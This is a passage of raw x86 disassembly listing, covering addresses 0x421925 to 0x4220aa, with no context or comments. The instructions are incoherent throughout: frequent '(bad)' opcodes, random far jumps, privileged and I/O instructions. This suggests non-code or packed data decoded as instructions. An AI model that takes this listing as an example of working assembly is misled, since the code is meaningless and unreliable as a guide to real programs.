  421925:	(bad)  
  421926:	mov    bh,0x42
  421928:	fisttp WORD PTR [esi+0x77]
  42192b:	inc    edx
  42192c:	bound  ebx,QWORD PTR [ebx-0x11206b97]
  421932:	or     ah,0x73
  421935:	xchg   BYTE PTR [edx],bl
  421937:	stos   BYTE PTR es:[edi],al
  421938:	cdq    
  421939:	call   0xb9046e59
  42193e:	and    ecx,ebp
  421940:	xor    DWORD PTR [edx+0x4e],edi
  421943:	nop
  421944:	jb     0x4218f7
  421946:	jecxz  0x421918
  421948:	xchg   DWORD PTR [ebp-0x56],edi
  42194b:	xchg   al,dl
  42194d:	adc    DWORD PTR [edx],edi
  42194f:	loope  0x4218ff
  421951:	int    0x32
  421953:	jl     0x421959
  421955:	xchg   edi,eax
  421956:	dec    esi
  421957:	inc    ebp
  421958:	and    DWORD PTR [ebx+0x12],ebx
  42195b:	nop
  42195c:	mov    es,esi
  42195e:	dec    ebp
  42195f:	cwde   
  421960:	cmp    edi,edi
  421962:	icebp  
  421963:	sub    ecx,ebx
  421965:	mov    ch,0x51
  421967:	push   edx
  421968:	adc    cl,ah
  42196a:	cli    
  42196b:	jb     0x42192d
  42196d:	ret    0xf30e
  421970:	dec    ebp
  421971:	iret   
  421972:	xor    bl,BYTE PTR [ebp-0x6b08a59c]
  421978:	pop    ds
  421979:	add    DWORD PTR [ebx-0x5494fdc2],0x31
  421980:	ret    0x607f
  421983:	xlat   BYTE PTR ds:[ebx]
  421984:	sahf   
  421985:	pushf  
  421986:	jmp    0x869a:0x14057b37
  42198d:	sub    edx,esi
  42198f:	mov    dh,0x8e
  421991:	adc    al,0x95
  421993:	mov    BYTE PTR [edx+esi*1],al
  421996:	popa   
  421997:	jp     0x42192a
  421999:	jbe    0x421a01
  42199b:	shl    DWORD PTR [edi],0xfc
  42199e:	js     0x421a18
  4219a0:	js     0x421999
  4219a2:	sbb    BYTE PTR [edx-0x5a873425],dl
  4219a8:	jae    0x421962
  4219aa:	dec    eax
  4219ab:	jne    0x421a0e
  4219ad:	jmp    0x4219da
  4219af:	cs xchg edx,eax
  4219b1:	pop    ss
  4219b2:	jg     0x4219fc
  4219b4:	mov    BYTE PTR [eax+edx*4+0x78cc0794],dl
  4219bb:	mov    dl,0x18
  4219bd:	mov    edi,DWORD PTR [edx-0x51]
  4219c0:	dec    edx
  4219c1:	mov    eax,esp
  4219c3:	pop    esi
  4219c4:	iret   
  4219c5:	popa   
  4219c6:	bnd jg 0x42196a
  4219c9:	jmp    0x9749:0x968807eb
  4219d0:	das    
  4219d1:	and    eax,DWORD PTR [esi+0x30]
  4219d4:	xor    BYTE PTR [edx+ebx*8-0x17501340],al
  4219db:	fstp   QWORD PTR [ecx]
  4219dd:	mov    al,ds:0x5f324fa
  4219e2:	xlat   BYTE PTR ds:[ebx]
  4219e3:	jmp    0xe3e1:0x4621e935
  4219ea:	cmp    ecx,eax
  4219ec:	jl     0x421a65
  4219ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ef:	inc    ebp
  4219f0:	repnz (bad) 
  4219f2:	xlat   BYTE PTR ds:[ebx]
  4219f3:	inc    esi
  4219f4:	clc    
  4219f5:	rol    bl,0xd0
  4219f8:	xchg   esi,eax
  4219f9:	sbb    DWORD PTR [esp],0xffffff81
  4219fd:	jbe    0x421989
  4219ff:	dec    ebp
  421a00:	mov    esp,0xab0ab188
  421a05:	stc    
  421a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a07:	shr    DWORD PTR [ebx+0x6c75c337],cl
  421a0d:	pop    ebp
  421a0e:	fwait
  421a0f:	xchg   ebx,eax
  421a10:	or     al,0x12
  421a12:	pop    eax
  421a13:	stos   BYTE PTR es:[edi],al
  421a14:	and    DWORD PTR [eax],edi
  421a16:	je     0x4219ca
  421a18:	mov    cl,0x13
  421a1a:	and    esp,ebp
  421a1c:	fxtract 
  421a1e:	sbb    ebx,ebp
  421a20:	test   cl,dh
  421a22:	into   
  421a23:	into   
  421a24:	repz jbe 0x421a40
  421a27:	inc    eax
  421a28:	or     dh,BYTE PTR [ebp+0x8]
  421a2b:	int    0x2a
  421a2d:	jo     0x4219dd
  421a2f:	fisub  DWORD PTR [ecx]
  421a31:	shl    BYTE PTR [ebp-0x67b689e0],0xd0
  421a38:	fwait
  421a39:	and    ebx,esi
  421a3b:	mov    esp,0xdc11b4ca
  421a40:	inc    esi
  421a41:	ret    
  421a42:	mov    esi,0x4da15143
  421a47:	rol    DWORD PTR [ecx],1
  421a49:	push   ebx
  421a4a:	ret    
  421a4b:	int    0x74
  421a4d:	fisubr WORD PTR [edi+ecx*1]
  421a50:	data16 add BYTE PTR [edi+0x70],dh
  421a54:	push   esp
  421a55:	and    esi,DWORD PTR [edi+eiz*8-0x70]
  421a59:	out    0x89,al
  421a5b:	inc    eax
  421a5c:	(bad)  [ebx-0x48]
  421a5f:	and    al,0xc6
  421a61:	lods   eax,DWORD PTR ds:[esi]
  421a62:	fsubrp st(6),st
  421a64:	cmp    BYTE PTR [ecx-0x22000d84],cl
  421a6a:	cmp    al,0x4e
  421a6c:	inc    edx
  421a6d:	pop    ss
  421a6e:	pop    ebp
  421a6f:	dec    esp
  421a70:	(bad)  [bx+si-0x216c]
  421a75:	clc    
  421a76:	call   DWORD PTR [edx-0x67]
  421a79:	jp     0x421abf
  421a7b:	inc    ebx
  421a7c:	shl    DWORD PTR [ecx+0x53c654d4],cl
  421a82:	xchg   esp,eax
  421a83:	cwde   
  421a84:	out    dx,eax
  421a85:	lods   eax,DWORD PTR ds:[esi]
  421a86:	aad    0xac
  421a88:	cli    
  421a89:	inc    eax
  421a8a:	cmp    BYTE PTR [eax],ah
  421a8c:	(bad)  
  421a8d:	xchg   edx,eax
  421a8e:	test   BYTE PTR [edx-0x7fb238d1],al
  421a94:	jno    0x421abb
  421a96:	push   esp
  421a97:	jno    0x421a21
  421a99:	xor    ch,BYTE PTR [esp+ebx*1]
  421a9c:	repnz cs addr16 xor eax,0x23974b49
  421aa4:	pop    esp
  421aa5:	pop    ecx
  421aa6:	lahf   
  421aa7:	xlat   BYTE PTR ds:[ebx]
  421aa8:	inc    ebp
  421aa9:	leave  
  421aaa:	xor    BYTE PTR [edi+0x1388490d],dl
  421ab0:	dec    ebp
  421ab1:	sahf   
  421ab2:	jg     0x421aa0
  421ab4:	leave  
  421ab5:	xor    BYTE PTR [esi-0xe5223c4],ah
  421abb:	dec    eax
  421abc:	aad    0xe9
  421abe:	cmp    bh,BYTE PTR [ebp-0x6225cd08]
  421ac4:	push   es
  421ac5:	shr    esi,1
  421ac7:	adc    edi,esp
  421ac9:	lock sbb edx,edi
  421acc:	or     al,BYTE PTR [ebx]
  421ace:	sub    ebp,DWORD PTR [edi+eax*1+0x72bf65a2]
  421ad5:	and    ebx,DWORD PTR [edx-0x15c66422]
  421adb:	ins    DWORD PTR es:[edi],dx
  421adc:	loop   0x421b04
  421ade:	pop    edi
  421adf:	mov    ebp,ss
  421ae1:	dec    eax
  421ae2:	ja     0x421b62
  421ae4:	(bad)  
  421ae5:	jmp    0x421abc
  421ae7:	dec    ebx
  421ae8:	inc    edx
  421ae9:	and    esp,DWORD PTR ds:0x94145b96
  421aef:	add    DWORD PTR [edx],0xffffffcf
  421af2:	clts   
  421af4:	xchg   cl,ah
  421af6:	inc    ebx
  421af7:	mov    ch,0x6b
  421af9:	fidiv  DWORD PTR [edx+edi*4+0x7c]
  421afd:	xchg   BYTE PTR [ebp-0x7d],bl
  421b00:	cmp    al,0x92
  421b02:	(bad)  
  421b03:	arpl   WORD PTR [esi+0x27],sp
  421b06:	xchg   ebx,eax
  421b07:	jmp    0x421b73
  421b09:	push   bp
  421b0b:	add    edx,DWORD PTR [edx+0x27]
  421b0e:	sbb    dl,BYTE PTR [edi]
  421b10:	cmp    bl,BYTE PTR [eax+0x593b296a]
  421b16:	stos   DWORD PTR es:[edi],eax
  421b17:	inc    esp
  421b18:	ins    DWORD PTR es:[edi],dx
  421b19:	xor    dl,BYTE PTR [eax+0x65]
  421b1c:	sub    BYTE PTR [ebp+ecx*2-0x34],bh
  421b20:	les    edi,FWORD PTR [edi+0x6cc8e983]
  421b26:	imul   eax,DWORD PTR [ebx+0x5f],0xffffffb7
  421b2a:	and    al,0x64
  421b2c:	dec    ecx
  421b2d:	dec    DWORD PTR [edi-0x7]
  421b30:	mov    ds:0xd177eafb,eax
  421b35:	hlt    
  421b36:	je     0x421ba1
  421b38:	dec    ebx
  421b39:	cmp    dh,BYTE PTR [ecx-0x5]
  421b3c:	and    ch,cl
  421b3e:	iret   
  421b3f:	cmp    BYTE PTR [ebx+eax*4-0x3],bh
  421b43:	mov    eax,ds:0x5825753a
  421b48:	xchg   edx,eax
  421b49:	lea    ebp,[ebp+0x46ceab96]
  421b4f:	dec    ebp
  421b50:	fst    QWORD PTR [edx+0x5d]
  421b53:	jl     0x421b5f
  421b55:	sub    BYTE PTR [eax],0xac
  421b58:	xchg   DWORD PTR [edi],edi
  421b5a:	imul   esi,DWORD PTR [edx],0xffffffb7
  421b5d:	js     0x421aef
  421b5f:	das    
  421b60:	pop    esi
  421b61:	inc    eax
  421b62:	ret    
  421b63:	clc    
  421b64:	(bad)  
  421b65:	mov    bl,BYTE PTR [ebx]
  421b67:	pop    es
  421b68:	scas   eax,DWORD PTR es:[edi]
  421b69:	les    ebx,FWORD PTR [ebx+esi*4+0x54]
  421b6d:	ins    DWORD PTR es:[edi],dx
  421b6e:	out    dx,eax
  421b6f:	inc    edx
  421b70:	adc    BYTE PTR [eax],bh
  421b72:	jge    0x421b6e
  421b74:	mov    cl,0x1d
  421b76:	inc    ebx
  421b77:	(bad)  
  421b78:	mov    dl,0xb3
  421b7a:	fadd   DWORD PTR [eax]
  421b7c:	inc    DWORD PTR [ebx]
  421b7e:	fistp  WORD PTR [ecx+0x6f]
  421b81:	push   esp
  421b82:	jns    0x421b47
  421b84:	mov    bh,0xe
  421b86:	sar    DWORD PTR [edi],1
  421b88:	push   ecx
  421b89:	call   0x5cc86d88
  421b8e:	and    BYTE PTR [edi+0x36],bh
  421b91:	adc    ebp,0xffffffc5
  421b94:	push   ss
  421b95:	out    dx,al
  421b96:	or     DWORD PTR [ecx-0x392f757a],eax
  421b9c:	les    eax,FWORD PTR [edx+0x27]
  421b9f:	inc    ecx
  421ba0:	ret    0x1b64
  421ba3:	es inc ecx
  421ba5:	push   eax
  421ba6:	xor    eax,0xbbfcaf4e
  421bab:	mov    ah,0xa3
  421bad:	xor    eax,0xa1e94aef
  421bb2:	(bad)  
  421bb3:	pusha  
  421bb4:	aaa    
  421bb5:	jmp    DWORD PTR [esi+0x44]
  421bb8:	dec    esp
  421bb9:	xchg   ebx,eax
  421bba:	fwait
  421bbb:	enter  0x98a7,0x2
  421bbf:	xchg   DWORD PTR [ebx],ebp
  421bc1:	dec    esp
  421bc2:	(bad)  
  421bc3:	in     eax,dx
  421bc4:	mov    es,WORD PTR [esi+0x6f213a12]
  421bca:	inc    ecx
  421bcb:	imul   esi,DWORD PTR [ebx],0x9df86692
  421bd1:	test   DWORD PTR [edx+0x7],edi
  421bd4:	enter  0x960f,0xea
  421bd8:	mov    edx,0xcc6d5349
  421bdd:	ficom  DWORD PTR [ecx-0x6e]
  421be0:	cwde   
  421be1:	arpl   sp,sp
  421be3:	pop    edi
  421be4:	pop    ebx
  421be5:	cmc    
  421be6:	jle    0x421bcb
  421be8:	dec    esp
  421be9:	push   ecx
  421bea:	pop    ds
  421beb:	enter  0xe263,0xe2
  421bef:	arpl   WORD PTR [esi],bx
  421bf1:	jmp    0xea37fba9
  421bf6:	inc    eax
  421bf7:	add    DWORD PTR [ebx-0x6f],esp
  421bfa:	retf   
  421bfb:	jno    0x421c36
  421bfd:	or     BYTE PTR [eax],al
	...
  421c07:	add    BYTE PTR [eax],al
  421c09:	add    BYTE PTR [esi+0x43],dl
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x2256168e]
  421c18:	jle    0x421c13
  421c1a:	mov    ah,0xaa
  421c1c:	add    DWORD PTR [eax],eax
  421c1e:	jl     0x421c26
  421c20:	add    BYTE PTR [eax],al
  421c22:	clc    
  421c23:	push   0x41
  421c25:	imul   ecx,ebx,0x3c
  421c28:	cmp    BYTE PTR [edx-0x1ad8b0a9],0x58
  421c2f:	cld    
  421c30:	pop    ebx
  421c31:	sub    eax,0xc4cc1d58
  421c36:	pop    edi
  421c37:	jnp    0x421caa
  421c39:	or     eax,0x50442a74
  421c3e:	and    esi,DWORD PTR [eax-0x323c9e85]
  421c44:	dec    esp
  421c45:	aas    
  421c46:	xchg   edi,eax
  421c47:	(bad)  
  421c48:	into   
  421c49:	add    eax,DWORD PTR [edi]
  421c4b:	retf   
  421c4c:	and    al,0x53
  421c4e:	jmp    0xbf38:0xef8e69a7
  421c55:	in     al,dx
  421c56:	jb     0x421c3a
  421c58:	out    0x9a,al
  421c5a:	or     dh,BYTE PTR [ebx-0x6506f6d9]
  421c60:	add    DWORD PTR [eax-0x54ee23a3],ebx
  421c66:	xlat   BYTE PTR ds:[ebx]
  421c67:	jmp    0x421c22
  421c69:	sbb    BYTE PTR [esi-0xc],ah
  421c6c:	fld    QWORD PTR [esi+0x10367ff1]
  421c72:	xor    eax,DWORD PTR [esi-0x58db7064]
  421c78:	jb     0x421c55
  421c7a:	and    al,0x3b
  421c7c:	stos   BYTE PTR es:[edi],al
  421c7d:	mov    al,0xb7
  421c7f:	inc    ebp
  421c80:	jbe    0x421ce0
  421c82:	(bad)  
  421c84:	sub    al,al
  421c86:	adc    ebx,DWORD PTR [ebp-0xc04fdac]
  421c8c:	mov    eax,0x1bbbe5f1
  421c91:	shl    DWORD PTR [edi+0x42],1
  421c94:	(bad)  
  421c95:	cmp    BYTE PTR [ebp-0x50],ah
  421c98:	pop    edx
  421c99:	adc    BYTE PTR [eax-0x21ce7593],ah
  421c9f:	inc    ebp
  421ca0:	std    
  421ca1:	push   ecx
  421ca2:	xchg   ebx,eax
  421ca3:	addr16 data16 hlt 
  421ca6:	cmp    al,BYTE PTR [edi+0x59]
  421ca9:	ins    DWORD PTR es:[edi],dx
  421caa:	fbld   TBYTE PTR ds:0x67d6bf68
  421cb0:	push   esp
  421cb1:	les    ebp,FWORD PTR [ebx]
  421cb3:	mov    edi,0x35e788df
  421cb8:	addr16 jne 0x421d16
  421cbb:	cdq    
  421cbc:	inc    ebx
  421cbd:	repnz dec ecx
  421cbf:	cmp    DWORD PTR ds:[edi+0x4f2af8d7],esi
  421cc6:	leave  
  421cc7:	cld    
  421cc8:	out    0x7e,al
  421cca:	into   
  421ccb:	and    bl,ch
  421ccd:	push   edi
  421cce:	push   ds
  421ccf:	loopne 0x421c9e
  421cd1:	in     eax,dx
  421cd2:	push   esi
  421cd3:	(bad)  
  421cd4:	adc    al,0x51
  421cd6:	jb     0x421d43
  421cd8:	sub    DWORD PTR [edx-0xfc5a636],edx
  421cde:	std    
  421cdf:	lods   eax,DWORD PTR ds:[esi]
  421ce0:	ds or  bl,al
  421ce3:	dec    ebp
  421ce4:	sub    dh,dh
  421ce6:	xor    edi,DWORD PTR [esi+0x6bbb4190]
  421cec:	mov    ebx,0xc293efc4
  421cf1:	push   esi
  421cf2:	outs   dx,DWORD PTR ds:[esi]
  421cf3:	sti    
  421cf4:	hlt    
  421cf5:	loop   0x421d35
  421cf7:	mov    ds:0x78769b0c,al
  421cfc:	ficom  WORD PTR [ecx-0x55c43cac]
  421d02:	and    al,0x5c
  421d04:	pop    ds
  421d05:	gs pop esi
  421d07:	mov    dh,al
  421d09:	cmp    eax,0x1d127de3
  421d0e:	loopne 0x421d44
  421d10:	cld    
  421d11:	mov    ss,ecx
  421d13:	lahf   
  421d14:	jmp    0x421caf
  421d16:	outs   dx,DWORD PTR ds:[esi]
  421d17:	int    0x8c
  421d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d1a:	mov    ebp,0x3650beaf
  421d1f:	adc    DWORD PTR [edx],eax
  421d21:	cli    
  421d22:	nop
  421d23:	mov    ds:0xeb1fa99b,al
  421d28:	xchg   esp,eax
  421d29:	repz icebp 
  421d2b:	bnd jnp 0x421cb2
  421d2e:	pop    eax
  421d2f:	jne    0x421d79
  421d31:	mov    BYTE PTR [eax+edx*2+0xd],0x67
  421d36:	aad    0x52
  421d38:	aad    0xdf
  421d3a:	mov    eax,edi
  421d3c:	les    esi,FWORD PTR [ecx-0x4b0da6ab]
  421d42:	int3   
  421d43:	fmul   DWORD PTR [eax]
  421d45:	loop   0x421ce7
  421d47:	popf   
  421d48:	scas   eax,DWORD PTR es:[edi]
  421d49:	pushf  
  421d4a:	push   ebp
  421d4b:	cmp    eax,0xc5b82677
  421d50:	test   eax,0xf31ce21c
  421d55:	mov    ?,WORD PTR ds:0xbf3028e9
  421d5b:	outs   dx,DWORD PTR ds:[esi]
  421d5c:	mov    edx,0x42fd6d07
  421d61:	fisubr DWORD PTR [ebx]
  421d63:	sbb    al,0x5
  421d65:	shl    bh,0x55
  421d68:	gs test al,0x87
  421d6b:	pop    ebp
  421d6c:	daa    
  421d6d:	pop    eax
  421d6e:	call   0x50a2bb64
  421d73:	out    0xcb,eax
  421d75:	fimul  WORD PTR [edx]
  421d77:	jle    0x421d9a
  421d79:	mov    esi,DWORD PTR [eax]
  421d7b:	cmp    BYTE PTR [ebx+0x3536a8a6],ch
  421d81:	push   edx
  421d82:	(bad)  
  421d83:	lds    ebp,FWORD PTR [edx+ebp*2+0x74e79933]
  421d8a:	push   edx
  421d8b:	in     al,dx
  421d8c:	sbb    eax,0xa8478367
  421d91:	mov    ebx,0x2c7efb52
  421d96:	retf   0x7240
  421d99:	xor    DWORD PTR [ebp+0x71],eax
  421d9c:	out    0xeb,al
  421d9e:	jo     0x421e0f
  421da0:	cmp    eax,0xc169aa4c
  421da5:	sub    edi,DWORD PTR [edx+0x48]
  421da8:	arpl   WORD PTR [edi],ax
  421daa:	or     BYTE PTR [ecx+0x650e3858],0xf4
  421db1:	or     BYTE PTR [ebp+0x12a269aa],ah
  421db7:	mov    cl,cl
  421db9:	retf   
  421dba:	sti    
  421dbb:	jle    0x421d56
  421dbd:	xor    ecx,DWORD PTR [esi+0x669a0a95]
  421dc3:	inc    edx
  421dc4:	adc    DWORD PTR [esi],ebx
  421dc6:	sti    
  421dc7:	daa    
  421dc8:	fs inc esi
  421dca:	cmp    BYTE PTR [esi-0x70],dh
  421dcd:	mov    edi,0x83aac057
  421dd2:	lahf   
  421dd3:	(bad)  
  421dd4:	(bad)  
  421dd6:	fdiv   QWORD PTR fs:[ecx+ebx*2+0x550ce3b7]
  421dde:	mov    ecx,0x61473846
  421de3:	adc    edx,ebp
  421de5:	or     al,0x3c
  421de7:	xchg   DWORD PTR [edi+0x61a8263d],eax
  421ded:	adc    cl,bh
  421def:	jns    0x421d9e
  421df1:	stc    
  421df2:	xor    eax,DWORD PTR [ebp+0x9]
  421df5:	cmp    BYTE PTR [ecx],dl
  421df7:	cwde   
  421df8:	dec    esp
  421df9:	xor    DWORD PTR [ebx],ebx
  421dfb:	mov    al,ds:0x8b4b9071
  421e00:	ret    0xd176
  421e03:	mov    bh,0x7c
  421e05:	repz or al,0x65
  421e08:	test   ebp,edi
  421e0a:	lds    ecx,FWORD PTR [eax+0x7c]
  421e0d:	mov    ?,WORD PTR [eax+0x392217da]
  421e13:	push   esi
  421e14:	xchg   ebx,eax
  421e15:	push   es
  421e16:	jo     0x421e07
  421e18:	scas   al,BYTE PTR es:[edi]
  421e19:	mov    ds:0xb0275fb2,al
  421e1e:	sub    al,0x1d
  421e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e21:	fcomp  st(1)
  421e23:	mov    ch,0x5f
  421e25:	adc    eax,0x93f6478f
  421e2a:	adc    DWORD PTR [esi+ebp*1+0x53],ebx
  421e2e:	inc    edx
  421e2f:	(bad)  
  421e32:	or     eax,ecx
  421e34:	push   esp
  421e35:	adc    DWORD PTR [ecx],edx
  421e37:	into   
  421e38:	mov    eax,ds:0x8a2cf26d
  421e3d:	mul    esp
  421e3f:	cmp    DWORD PTR [eax-0x35],ebx
  421e42:	bound  ecx,QWORD PTR ds:0x549eeeb4
  421e48:	(bad)  
  421e49:	and    al,0xb2
  421e4b:	retf   0x1fdd
  421e4e:	xchg   edi,eax
  421e4f:	xor    BYTE PTR [ecx],ah
  421e51:	out    dx,al
  421e52:	sub    DWORD PTR [ebp-0x51],edx
  421e55:	(bad)  
  421e56:	into   
  421e57:	xor    ebp,DWORD PTR [ebx+esi*2-0x11]
  421e5b:	cmc    
  421e5c:	fisub  DWORD PTR [ebx]
  421e5e:	inc    ecx
  421e5f:	das    
  421e60:	enter  0x916f,0xcc
  421e64:	aas    
  421e65:	jg     0x421e24
  421e67:	leave  
  421e68:	lock adc BYTE PTR [ebx+ecx*2+0x54c83813],ah
  421e70:	rcr    BYTE PTR [eax+edi*1+0x47],0x45
  421e75:	dec    eax
  421e76:	loopne 0x421e68
  421e78:	adc    ecx,ebp
  421e7a:	inc    ebp
  421e7b:	mov    dh,0x70
  421e7d:	call   0x70f3716
  421e82:	fist   DWORD PTR [edi*8-0x3eb7d140]
  421e89:	cs or  eax,0xd62b46b8
  421e8f:	or     DWORD PTR cs:[esi-0x2674a4e7],edx
  421e96:	cmc    
  421e97:	mov    eax,0x4ab22ff6
  421e9c:	xor    eax,0x8afa8d08
  421ea1:	push   edx
  421ea2:	push   cs
  421ea3:	icebp  
  421ea4:	sub    eax,0x1eeb25a5
  421ea9:	mov    edx,0x549cff77
  421eae:	nop
  421eaf:	jecxz  0x421ec4
  421eb1:	xor    eax,0xa53404fc
  421eb6:	test   DWORD PTR [eax+0x66e716db],edi
  421ebc:	retf   0x40be
  421ebf:	test   BYTE PTR [ebp-0x59],ah
  421ec2:	push   edx
  421ec3:	pop    eax
  421ec4:	lock add eax,0xcb20fd00
  421eca:	rcl    esi,0x3c
  421ecd:	push   edi
  421ece:	inc    esi
  421ecf:	in     eax,dx
  421ed0:	dec    eax
  421ed1:	inc    ebp
  421ed2:	pop    edi
  421ed3:	not    BYTE PTR [ebp+0x54]
  421ed6:	pop    ebx
  421ed7:	xlat   BYTE PTR ds:[ebx]
  421ed8:	push   esp
  421ed9:	bound  eax,QWORD PTR [esi+edx*4]
  421edc:	cmp    eax,0x92a07b96
  421ee1:	cmp    DWORD PTR [edi+0x7e],edi
  421ee4:	and    al,0xc7
  421ee6:	mov    dh,dl
  421ee8:	adc    DWORD PTR ds:0x2ca19bf,eax
  421eee:	mov    al,ds:0xd13b0966
  421ef3:	fchs   
  421ef5:	push   ecx
  421ef6:	fcomp  QWORD PTR [ecx+0x1466459b]
  421efc:	ins    DWORD PTR es:[edi],dx
  421efd:	push   0x6d167855
  421f02:	jns    0x421f2b
  421f04:	data16 sbb bl,BYTE PTR [eax+0x5d9f1ece]
  421f0b:	or     DWORD PTR [edi],0x52
  421f0e:	xlat   BYTE PTR ds:[ebx]
  421f0f:	lock dec edi
  421f11:	push   esp
  421f12:	sbb    al,BYTE PTR [esp+edx*2-0x2e3e05be]
  421f19:	and    BYTE PTR [ecx-0x30f74b3c],bh
  421f1f:	ins    BYTE PTR es:[edi],dx
  421f20:	(bad)  
  421f21:	gs mov edi,0x7ad6c650
  421f27:	loopne 0x421f36
  421f29:	jo     0x421f1d
  421f2b:	or     eax,0xe1ae99b8
  421f30:	(bad)
  421f35:	pop    edx
  421f36:	bound  ecx,QWORD PTR [edx+edx*8-0x39a6c99e]
  421f3d:	ins    DWORD PTR es:[edi],dx
  421f3e:	pop    esp
  421f3f:	jle    0x421fb7
  421f41:	xchg   ecx,eax
  421f42:	pop    ebx
  421f43:	mov    cl,0x33
  421f45:	enter  0x1773,0xd9
  421f49:	push   ebx
  421f4a:	pop    eax
  421f4b:	inc    edx
  421f4c:	(bad)  
  421f4d:	shr    BYTE PTR [ebx-0x6f],cl
  421f50:	shr    BYTE PTR [ecx+edi*4],1
  421f53:	inc    ebp
  421f54:	or     ebx,DWORD PTR [eax]
  421f56:	ja     0x421fb8
  421f58:	mov    al,0x97
  421f5a:	not    BYTE PTR [ecx+0xcf956ed]
  421f60:	inc    ebp
  421f61:	mov    dh,BYTE PTR [ecx-0x41a3961c]
  421f67:	imul   edi,edi,0xffffffc1
  421f6a:	or     al,0xcb
  421f6c:	pushf  
  421f6d:	sbb    DWORD PTR [edx+0x3c],esi
  421f70:	mov    ds:0xbc70c3f3,al
  421f75:	cmp    esi,DWORD PTR [edi+0x5a3d9b93]
  421f7b:	xchg   edx,eax
  421f7c:	or     BYTE PTR [ecx-0x43b1a924],dh
  421f82:	bound  ebp,QWORD PTR [ecx+0x8]
  421f85:	cmp    ch,BYTE PTR [edx]
  421f87:	jae    0x421f6c
  421f89:	(bad)  
  421f8a:	cmp    DWORD PTR [ecx],esp
  421f8c:	cmp    BYTE PTR [ecx-0x74],ch
  421f8f:	jns    0x421f2a
  421f91:	ja     0x421f5c
  421f93:	mov    BYTE PTR ds:0x1e19bbc9,ch
  421f99:	stos   BYTE PTR es:[edi],al
  421f9a:	fmulp  st(4),st
  421f9c:	jp     0x421f7c
  421f9e:	loop   0x421f5f
  421fa0:	(bad)  
  421fa1:	dec    ebp
  421fa2:	scas   eax,DWORD PTR es:[edi]
  421fa3:	sbb    al,0xdd
  421fa5:	hlt    
  421fa6:	push   esi
  421fa7:	out    dx,eax
  421fa8:	adc    BYTE PTR [esi],0x8e
  421fab:	aam    0x9d
  421fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fae:	xor    DWORD PTR [ecx+0x84d8f1c],edx
  421fb4:	aaa    
  421fb5:	or     al,0x53
  421fb7:	(bad)  
  421fb8:	imul   edx,eax,0xdb3356ef
  421fbe:	jle    0x421f61
  421fc0:	dec    ebx
  421fc1:	clc    
  421fc2:	inc    edi
  421fc3:	icebp  
  421fc4:	mov    ds:0x2ee4b214,al
  421fc9:	fld    QWORD PTR [edx]
  421fcb:	(bad)  
  421fcc:	adc    dh,BYTE PTR [ebp*4+0x6776fe30]
  421fd3:	sub    DWORD PTR [edx+ebx*2],0x5179d871
  421fda:	int    0x56
  421fdc:	shr    DWORD PTR [ebp-0x7f0a315c],1
  421fe2:	cmp    DWORD PTR [ebx+ecx*2-0x2d],edi
  421fe6:	ret    0xa2f5
  421fe9:	mov    bl,0x20
  421feb:	ins    BYTE PTR es:[edi],dx
  421fec:	mov    al,gs:0xf39a7b31
  421ff2:	fcomp  QWORD PTR [ecx+0x37]
  421ff5:	jbe    0x422035
  421ff7:	push   eax
  421ff8:	dec    ecx
  421ff9:	pop    ds
  421ffa:	js     0x421f9a
  421ffc:	retf   
  421ffd:	xchg   edi,eax
  421ffe:	lds    esi,FWORD PTR [ebx]
  422000:	in     eax,dx
  422001:	inc    ecx
  422003:	imul   ebx,DWORD PTR [ebx],0xc9316160
  422009:	fs (bad) 
  42200b:	dec    ebp
  42200c:	jae    0x421fa0
  42200e:	xor    edi,ebp
  422010:	cmp    al,0xb0
  422012:	clc    
  422013:	xor    ecx,DWORD PTR [ebx+ebp*2-0x534b690c]
  42201a:	lods   al,BYTE PTR ds:[esi]
  42201b:	outs   dx,DWORD PTR ds:[esi]
  42201c:	push   0x58
  42201e:	and    esi,DWORD PTR [edi]
  422020:	lahf   
  422021:	push   eax
  422022:	lods   eax,DWORD PTR ds:[esi]
  422023:	hlt    
  422024:	pusha  
  422025:	imul   edx,esp,0xffffff97
  422028:	mov    bh,BYTE PTR [esi]
  42202a:	inc    ebx
  42202b:	pop    ss
  42202c:	test   al,0x41
  42202e:	aaa    
  42202f:	sti    
  422030:	xchg   ecx,eax
  422031:	sub    dh,BYTE PTR [edi-0x46]
  422034:	mov    bl,0x96
  422036:	mov    ecx,0x73c358f6
  42203b:	cmp    BYTE PTR [ecx-0x35],al
  42203e:	ror    al,cl
  422040:	(bad)  
  422041:	repz jle 0x422069
  422044:	lock or DWORD PTR [esi+0x8],esp
  422048:	xor    al,0xce
  42204a:	adc    al,0x70
  42204c:	cli    
  42204d:	sub    edi,DWORD PTR [edx]
  42204f:	add    bh,cl
  422051:	(bad)  
  422052:	or     al,0xb5
  422054:	(bad)  
  422055:	and    DWORD PTR [ebp+0x5e9d1ec6],ebp
  42205b:	or     al,0x1a
  42205d:	cld    
  42205e:	div    BYTE PTR [edi+0x24]
  422061:	iret   
  422062:	dec    eax
  422063:	inc    ebp
  422064:	adc    ecx,DWORD PTR [esi+eiz*4]
  422067:	or     eax,0xc179095
  42206c:	nop
  42206d:	sbb    eax,0x7db3b735
  422072:	pop    edi
  422073:	mov    BYTE PTR ds:0x78c9c8c1,bl
  422079:	daa    
  42207a:	leave  
  42207b:	mov    BYTE PTR [eax-0x79692fe2],ah
  422081:	pushf  
  422082:	pushf  
  422083:	fwait
  422084:	stos   BYTE PTR es:[edi],al
  422085:	xlat   BYTE PTR ds:[ebx]
  422086:	into   
  422087:	pusha  
  422088:	mov    eax,0xbd2b1b47
  42208d:	push   cs
  42208e:	jnp    0x4220ae
  422090:	inc    edx
  422091:	mov    bh,0xc
  422093:	mov    eax,0x47513fca
  422098:	bound  esp,QWORD PTR [ecx-0x4a]
  42209b:	test   BYTE PTR [esi-0x5e],al
  42209e:	out    dx,eax
  42209f:	pop    es
  4220a0:	ins    BYTE PTR es:[edi],dx
  4220a1:	push   DWORD PTR [edi+eiz*8-0x4a]
  4220a5:	cli    
  4220a6:	mov    ch,0x95
  4220a8:	fmulp  st(6),st
  4220aa:	adc    al,0xdb
